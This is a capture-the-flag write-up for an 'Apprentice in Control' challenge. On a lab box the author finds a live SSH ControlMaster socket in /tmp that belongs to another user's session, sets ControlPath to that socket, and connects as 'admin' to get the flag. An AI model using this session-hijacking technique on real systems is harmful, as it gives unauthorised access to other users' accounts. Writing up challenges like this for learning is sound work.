Apprentice in Control
===

By DisplayGFX

IWC Pre-DEFCON Challenge

For this, we have to ssh into a box.

## Initial Enumeration

Here, we land in a user's home directory.

```bash
dev@node-cafe:~$ ls -la
total 32
drwxr-x--- 1 dev  dev  4096 Aug  1 02:01 .
drwxr-xr-x 1 root root 4096 Jul 31 17:30 ..
-rw------- 1 dev  dev    29 Jul 31 17:30 .bash_history
-rw-r--r-- 1 dev  dev   220 Jul 31 17:30 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jul 31 17:30 .bashrc
-rw-r--r-- 1 dev  dev   807 Jul 31 17:30 .profile
drwx------ 2 dev  dev  4096 Aug  1 02:01 .ssh
dev@node-cafe:~$ 
```

lets read some of the files.

```bash
dev@node-cafe:~$ cat .bash_history 
r00k wuz h3r3
man ssh_config
```

Well, that's interesting. There is a ton in `ssh_config`, which you can read [here](https://linux.die.net/man/5/ssh_config)

But, lets keep enumerating. What about the files in `/tmp`

```bash
dev@node-cafe:~$ ls -la /tmp
total 8
drwxrwxrwt 1 root root 4096 Aug  1 02:01 .
drwxr-xr-x 1 root root 4096 Aug  1 02:01 ..
srw------- 1 dev  dev     0 Aug  1 02:01 sock
```
Huh, what's this file?

well, if we look at `ps aux`, we can see a program is using this file.
```bash
dev@node-cafe:~/.ssh$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4324  3200 ?        Ss   02:01   0:00 /bin/bash /root/entry.sh
root          19  0.0  0.0  11140  1460 ?        Ss   02:01   0:00 nginx: master process /usr/sbin/nginx
www-data      20  0.0  0.0  11508  2740 ?        S    02:01   0:00 nginx: worker process
www-data      21  0.0  0.0  11508  2740 ?        S    02:01   0:00 nginx: worker process
www-data      22  0.0  0.0  11508  2740 ?        S    02:01   0:00 nginx: worker process
www-data      23  0.0  0.0  11508  2612 ?        S    02:01   0:00 nginx: worker process
dev           24  0.0  0.0   4588  3968 pts/0    Ss   02:01   0:00 /bin/bash
root          41  0.0  0.0  12016  3976 ?        Ss   02:01   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          47  0.0  0.0  12516  6412 ?        Ss   02:01   0:00 sshd: admin [priv]
dev           51  0.0  0.0  12016  3628 ?        Ss   02:01   0:00 ssh: /tmp/sock [mux]
admin         61  0.0  0.0  12776  6092 ?        S    02:01   0:00 sshd: admin@notty
root          65  0.0  0.0   2728  1536 ?        S    02:01   0:00 tail -f /dev/null
dev          100  0.0  0.0   7888  4096 pts/0    R+   02:34   0:00 ps aux
```
Well, this is pretty indicative of it being used by ssh.

## SSH

Looking through the options of ssh, we can find this bit of data.

> **ControlMaster**  
Enables the sharing of multiple sessions over a single network connection. When set to ''yes'', **[ssh](https://linux.die.net/man/1/ssh)**(1) will listen for connections on a control socket specified using the **ControlPath** argument. Additional sessions can connect to this socket using the same **ControlPath** with **ControlMaster** set to ''no'' (the default). These sessions will try to reuse the master instance's network connection rather than initiating new ones, but will fall back to connecting normally if the control socket does not exist, or is not listening.

So, if we set the ControlPath to this file, we can use it. this can easily be done with `echo "ControlPath /tmp/sock" > ~/.ssh/config`

however, we still need a username. Looking at /etc/ssh might give us an answer

```bash
dev@node-cafe:~/.ssh$ ls -la /etc/ssh
total 656
drwxr-xr-x 4 root root   4096 Jul 31 17:30 .
drwxr-xr-x 1 root root   4096 Aug  1 02:01 ..
-rw-r--r-- 1 root root 620042 Jul  9 11:31 moduli
-rw-r--r-- 1 root root   1649 Jul  9 11:31 ssh_config
drwxr-xr-x 2 root root   4096 Jul  9 11:31 ssh_config.d
-rw------- 1 root root    513 Jul 31 17:30 ssh_host_ecdsa_key
-rw-r--r-- 1 root root    182 Jul 31 17:30 ssh_host_ecdsa_key.pub
-rw------- 1 root root    411 Jul 31 17:30 ssh_host_ed25519_key
-rw-r--r-- 1 root root    102 Jul 31 17:30 ssh_host_ed25519_key.pub
-rw------- 1 root root   2610 Jul 31 17:30 ssh_host_rsa_key
-rw-r--r-- 1 root root    574 Jul 31 17:30 ssh_host_rsa_key.pub
-rw-r--r-- 1 root root   3275 Jul 31 17:30 sshd_config
drwxr-xr-x 2 root root   4096 Jul  9 11:31 sshd_config.d
dev@node-cafe:~/.ssh$ tail /etc/ssh/sshd_config
# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
AllowUsers dev admin
```

We can just try the following command. `ssh admin`

And then, in the root directory, we get the flag!